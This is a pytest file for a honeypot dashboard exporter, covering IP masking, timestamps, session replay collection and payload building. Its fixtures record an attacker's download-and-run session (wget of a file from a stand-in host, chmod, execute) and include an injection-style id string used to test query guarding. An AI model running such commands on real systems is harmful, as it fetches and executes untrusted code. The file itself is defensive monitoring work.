"""The public export: masking, timestamps, the session replay guards, and the
shape build() hands the page."""

import live_export


def test_mask_hides_the_host_octet():
    assert live_export.mask("203.0.113.45") == "203.0.113.x"
    assert live_export.mask("8.8.8.8") == "8.8.8.x"


def test_mask_shortens_ipv6_and_handles_junk():
    assert live_export.mask("2001:db8:1234:5678::1") == "2001:db8:1234:...."
    assert live_export.mask("not-an-address") == "unknown"


def test_iso_timestamp_from_millis():
    # 1_700_000_000_000 ms is 2023-11-14T22:13:20Z.
    assert live_export.iso_timestamp(1_700_000_000_000) == "2023-11-14T22:13:20Z"
    assert live_export.iso_timestamp(None) == ""
    assert live_export.iso_timestamp("nope") == ""


def test_facet_normalises_to_a_list_of_strings():
    assert live_export.facet({"facet": ["FR", "France"]}) == ["FR", "France"]
    assert live_export.facet({"facet": "FR"}) == ["FR"]
    assert live_export.facet({"facet": None}) == []
    assert live_export.facet({}) == []


def _session_rows():
    return [
        {
            "command": "uname -a",
            "seq": 1,
            "since_prev_ms": 0,
            "src_ip": "203.0.113.5",
            "event_type": "ssh.command",
            "geo.country_iso": "FR",
            "timestamp": 1_700_000_000_000,
        },
        {
            "command": "cd /tmp; wget http://198.51.100.9/x",
            "seq": 2,
            "since_prev_ms": 1240,
            "geo.country_iso": "FR",
            "timestamp": 1_700_000_001_240,
        },
        {
            "command": "chmod +x x",
            "seq": 3,
            "since_prev_ms": 430,
            "geo.country_iso": "FR",
            "timestamp": 1_700_000_001_670,
        },
        {
            "command": "./x",
            "seq": 4,
            "since_prev_ms": 310,
            "geo.country_iso": "FR",
            "timestamp": 1_700_000_001_980,
        },
    ]


def _api():
    return {"account_id": 1, "api_key": "k", "region": "US"}


def test_collect_session_returns_commands_in_order(monkeypatch):
    monkeypatch.setattr(live_export, "run_nrql", lambda *a, **k: _session_rows())
    session = live_export.collect_session(_api(), "01JBQ3ABCDEF")
    assert session is not None
    assert session["country"] == "FR"
    assert [c["seq"] for c in session["commands"]] == [1, 2, 3, 4]
    assert session["commands"][0]["command"] == "uname -a"


def test_collect_session_labels_the_service_and_masks_the_address(monkeypatch):
    # The picker labels a session with where it came from and which honeypot
    # it typed into, and the address on a public page is never the whole one.
    monkeypatch.setattr(live_export, "run_nrql", lambda *a, **k: _session_rows())
    session = live_export.collect_session(_api(), "01JBQ3ABCDEF")
    assert session["service"] == "ssh"
    assert session["ip"] == "203.0.113.x"


def test_collect_session_refuses_an_id_outside_the_alphabet():
    # The id is interpolated into NRQL, so a value that is not the id
    # generator's own shape is never let into the query.
    assert live_export.collect_session(_api(), "bad'; DROP TABLE") is None


def test_collect_session_refuses_a_session_of_under_four_commands(monkeypatch):
    monkeypatch.setattr(live_export, "run_nrql", lambda *a, **k: _session_rows()[:3])
    assert live_export.collect_session(_api(), "01JBQ3ABCDEF") is None


def test_collect_session_drops_blank_commands(monkeypatch):
    rows = [
        *_session_rows(),
        {
            "command": "   ",
            "seq": 5,
            "since_prev_ms": 10,
            "src_ip": "203.0.113.5",
            "event_type": "ssh.command",
            "geo.country_iso": "FR",
            "timestamp": 1_700_000_002_000,
        },
    ]
    monkeypatch.setattr(live_export, "run_nrql", lambda *a, **k: rows)
    session = live_export.collect_session(_api(), "01JBQ3ABCDEF")
    assert len(session["commands"]) == 4  # the blank one is gone


def test_collect_sessions_returns_one_entry_per_busy_session(monkeypatch):
    monkeypatch.setattr(live_export, "run_nrql", lambda *a, **k: _session_rows())
    results = {
        "top_sessions": [
            {"facet": "01JBQ3ABCDEF", "commands": 9},
            {"facet": "01JBQ3GHJKMN", "commands": 7},
        ]
    }
    sessions = live_export.collect_sessions(_api(), results)
    assert len(sessions) == 2
    assert all(len(item["commands"]) == 4 for item in sessions)


def test_collect_sessions_stops_at_the_first_short_session(monkeypatch):
    # The facet comes back ordered by count, so everything after a session
    # under the floor is shorter still.
    monkeypatch.setattr(live_export, "run_nrql", lambda *a, **k: _session_rows())
    results = {
        "top_sessions": [
            {"facet": "01JBQ3ABCDEF", "commands": 9},
            {"facet": "01JBQ3GHJKMN", "commands": 2},
            {"facet": "01JBQ3PQRSTV", "commands": 2},
        ]
    }
    assert len(live_export.collect_sessions(_api(), results)) == 1


def test_collect_sessions_caps_the_list(monkeypatch):
    monkeypatch.setattr(live_export, "run_nrql", lambda *a, **k: _session_rows())
    results = {"top_sessions": [{"facet": "01JBQ3ABCDEF", "commands": 9} for _ in range(8)]}
    sessions = live_export.collect_sessions(_api(), results)
    assert len(sessions) == live_export.REPLAY_SESSIONS


def test_collect_sessions_handles_no_session():
    assert live_export.collect_sessions(_api(), {"top_sessions": []}) == []


def _results_for_build():
    return {
        "totals": [{"events": 1380, "attackers": 15, "sessions": 334}],
        "captures": [{"samples": 0}],
        "countries": [{"facet": ["FR", "France"], "attacks": 718, "attackers": 1}],
        "passwords": [{"facet": "123456", "tries": 40}],
        "usernames": [{"facet": "root", "tries": 30}],
        "commands": [{"facet": "uname -a", "seen": 4}],
        "techniques": [{"facet": ["T1105", "Ingress Tool Transfer"], "events": 9}],
        "recent": [
            {
                "timestamp": 1_700_000_000_000,
                "src_ip": "203.0.113.5",
                "geo.country_iso": "FR",
                "event_type": "ssh.command",
                "username": "",
                "password": "",
                "command": "id",
            }
        ],
        "daily": [{"beginTimeSeconds": 1_700_000_000, "count": 5}],
        "origins": [
            {
                "facet": ["Paris", "FR", "France"],
                "attacks": 718,
                "attackers": 1,
                "lat": 48.85,
                "lon": 2.35,
            }
        ],
        "located": [{"located": 756}],
        "first_event": [{"first": 1_699_000_000_000}],
        "top_sessions": [],
    }


def test_build_shapes_the_payload():
    payload = live_export.build(_results_for_build(), "sensor.example", None)
    assert payload["totals"]["events"] == 1380
    assert payload["totals"]["countries"] == 1
    assert payload["countries"][0]["iso2"] == "FR"
    assert payload["located_events"] == 756
    assert payload["collecting_since"] == "2023-11-03T08:26:40Z"
    assert payload["recent"][0]["ip"] == "203.0.113.x"  # masked
    assert payload["session"] is None
    assert payload["sessions"] == []


def test_build_masks_every_recent_address():
    payload = live_export.build(_results_for_build(), "t", None)
    for event in payload["recent"]:
        assert event["ip"].endswith(".x") or ":...." in event["ip"] or event["ip"] == "unknown"
